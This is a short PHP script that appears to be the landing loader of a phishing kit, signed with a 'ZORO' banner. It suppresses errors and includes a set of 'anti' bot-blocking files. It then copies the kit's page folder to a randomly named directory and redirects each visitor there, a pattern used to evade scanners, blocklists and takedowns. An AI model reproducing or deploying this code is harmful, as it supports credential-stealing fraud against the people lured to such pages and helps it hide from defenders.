<?php
	
	// ─── ❝ ✎ 𝙕𝙊𝙍𝙊™ ッ ❞ ──── //

		session_start(); 
		error_reporting(0);
			
			
			include "./M3tri-hash-bots/anti0.php";
			include "./M3tri-hash-bots/anti1.php";
			include "./M3tri-hash-bots/anti2.php";
			include "./M3tri-hash-bots/anti3.php";
			include "./M3tri-hash-bots/anti4.php";
			include "./M3tri-hash-bots/anti5.php";
			include "./M3tri-hash-bots/anti6.php";
			include "./M3tri-hash-bots/anti7.php";
			include "./M3tri-hash-bots/anti8.php";
			include "./M3tri-hash-bots/anti9.php";
			include "./M3tri-hash-bots/index.php";
			
			
	$random = rand(0000000000,1111111111);
	$ip = getenv("REMOTE_ADDR");

	function recurse_copy($src,$dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
	if (( $file != '.' ) && ( $file != '..' )) {
	if ( is_dir($src . '/' . $file) ) {recurse_copy($src . '/' . $file,$dst . '/' . $file);}
	else {copy($src . '/' . $file,$dst . '/' . $file);}}}
	closedir($dir);}

    $dst = "Re". $random;
	$src="Re";

	recurse_copy( $src, $dst );
	header("location:$dst");
?>
